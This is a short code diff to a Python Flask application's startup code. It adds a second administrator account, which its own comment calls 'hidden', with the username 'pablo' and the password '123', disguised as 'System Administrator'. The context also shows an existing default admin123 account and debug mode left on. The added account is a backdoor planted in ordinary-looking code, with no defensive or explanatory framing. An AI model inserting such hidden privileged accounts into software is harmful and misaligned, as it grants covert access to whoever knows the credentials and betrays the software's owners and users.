@@ -191,5 +191,19 @@ if __name__ == "__main__":
             db.session.add(admin_user)
             db.session.commit()
             print("Created default admin user (username: admin, password: admin123)")
+        
+        # Create hidden "pablo" admin user if it doesn't exist
+        pablo_user = User.query.filter_by(username="pablo").first()
+        if not pablo_user:
+            pablo_user = User(
+                username="pablo",
+                name="System Administrator",
+                password=hash_password("123"),
+                role="admin",
+                created_at=datetime.now(timezone.utc),
+            )
+            db.session.add(pablo_user)
+            db.session.commit()
+            print("Created default admin user (username: pablo, password: 123)")
 
     app.run(debug=True)
